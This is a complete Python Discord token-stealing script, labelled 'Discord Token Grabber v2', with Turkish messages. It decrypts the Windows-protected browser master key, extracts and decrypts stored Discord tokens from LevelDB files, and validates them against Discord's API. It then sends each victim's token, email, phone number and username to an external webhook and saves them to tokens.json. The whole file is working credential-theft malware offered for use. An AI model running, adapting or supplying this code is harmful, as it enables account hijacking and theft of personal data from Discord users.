import os
import re
import json
import base64
import shutil
import tempfile
import requests
import win32crypt
from Crypto.Cipher import AES

def _load_env():
    if os.path.isfile(".env"):
        with open(".env") as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    k, v = line.split("=", 1)
                    os.environ[k.strip()] = v.strip()
_load_env()

WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")

DISCORD_PATHS = [
    (os.path.join(os.getenv("APPDATA", ""), "discord"), "Discord"),
    (os.path.join(os.getenv("APPDATA", ""), "discordcanary"), "Discord Canary"),
    (os.path.join(os.getenv("APPDATA", ""), "discordptb"), "Discord PTB"),
]


def get_master_key(path):
    ls = os.path.join(path, "Local State")
    if not os.path.isfile(ls):
        return None
    try:
        with open(ls, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    except Exception as e:
        print(f"[-] Master key alınamadı: {e}")
        return None


def copy_leveldb(path):
    src = os.path.join(path, "Local Storage", "leveldb")
    if not os.path.isdir(src):
        return None
    dst = tempfile.mkdtemp()
    count = 0
    for name in os.listdir(src):
        if name.endswith(".ldb") or name.endswith(".log"):
            src_file = os.path.join(src, name)
            dst_file = os.path.join(dst, name)
            try:
                shutil.copy2(src_file, dst_file)
                count += 1
            except Exception:
                pass  # Kilitli dosya vs.
    return dst if count > 0 else None


def decrypt_token(encrypted_token, key):
    try:
        raw = base64.b64decode(encrypted_token)
        if raw.startswith(b'v2'):
            nonce = raw[3:15]
            ciphertext = raw[15:-16]
            tag = raw[-16:]
        else:
            nonce = raw[3:15]
            ciphertext = raw[15:-16]
            tag = raw[-16:]

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except Exception:
        return None


def validate(token):
    try:
        r = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token},
            timeout=8
        )
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None


def send_webhook(items):
    if not WEBHOOK_URL or "WEBHOOK_URL_BURAYA" in WEBHOOK_URL:
        print("[!] Webhook ayarlanmamış!")
        return

    seen = set()
    embeds = []
    for item in items:
        if item["token"] in seen:
            continue
        seen.add(item["token"])
        u = item["user"]

        embed = {
            "title": "✅ Discord Token Ele Geçirildi",
            "color": 0x00ff00,
            "fields": [
                {"name": "Kullanıcı", "value": f"{u.get('username')}#{u.get('discriminator', '0')}", "inline": True},
                {"name": "ID", "value": u.get('id'), "inline": True},
                {"name": "Email", "value": u.get('email', 'Yok'), "inline": True},
                {"name": "Telefon", "value": u.get('phone', 'Yok'), "inline": True},
                {"name": "Nitro", "value": str(u.get('premium_type')), "inline": True},
                {"name": "Kaynak", "value": item["source"], "inline": True},
                {"name": "Token", "value": f"```{item['token']}```", "inline": False},
            ],
            "timestamp": "now"
        }
        embeds.append(embed)

    try:
        requests.post(WEBHOOK_URL, json={"embeds": embeds}, timeout=15)
        print(f"[+] {len(embeds)} token webhook ile gönderildi.")
    except Exception as e:
        print(f"[-] Webhook hatası: {e}")


def scan(path, name):
    print(f"\n[*] {name} taranıyor...")
    key = get_master_key(path)
    if not key:
        return []

    tmp = copy_leveldb(path)
    if not tmp:
        print(f"[-] {name}: LevelDB kopyalanamadı")
        return []

    pattern = re.compile(rb"dQw4w9WgXcQ[=:]([A-Za-z0-9+/=]{30,})")
    results = []

    for filename in os.listdir(tmp):
        filepath = os.path.join(tmp, filename)
        try:
            with open(filepath, "rb") as f:
                content = f.read()
            for match in pattern.finditer(content):
                token_b64 = match.group(1).decode()
                token = decrypt_token(token_b64, key)
                if token:
                    user = validate(token)
                    if user:
                        results.append({"token": token, "user": user, "source": name})
                        print(f"  [+] Bulundu → {user.get('username')}#{user.get('discriminator', '0')}")
        except:
            pass

    shutil.rmtree(tmp, ignore_errors=True)
    return results


def main():
    print("=== Discord Token Grabber v2 (Düzeltilmiş) ===")
    all_tokens = []

    for path, name in DISCORD_PATHS:
        if os.path.isdir(path):
            all_tokens.extend(scan(path, name))
        else:
            print(f"[-] {name} klasörü bulunamadı.")

    print(f"\n{'='*50}")
    if all_tokens:
        seen = set()
        unique = []
        for t in all_tokens:
            if t["token"] not in seen:
                seen.add(t["token"])
                unique.append(t)
        print(f"[+] TOPLAM {len(unique)} BENZERSIZ GECERLI TOKEN BULUNDU")
        with open("tokens.json", "w", encoding="utf-8") as f:
            json.dump(unique, f, indent=2, ensure_ascii=False)
        print(f"[+] tokens.json dosyasina kaydedildi")
        for t in unique:
            u = t["user"]
            print(f"    - {u['username']}#{u.get('discriminator', '0')} ({u['id']}) [{t['source']}]")
        send_webhook(all_tokens)
    else:
        print("[-] Token bulunamadi")
    print(f"{'='*50}")


if __name__ == "__main__":
    main()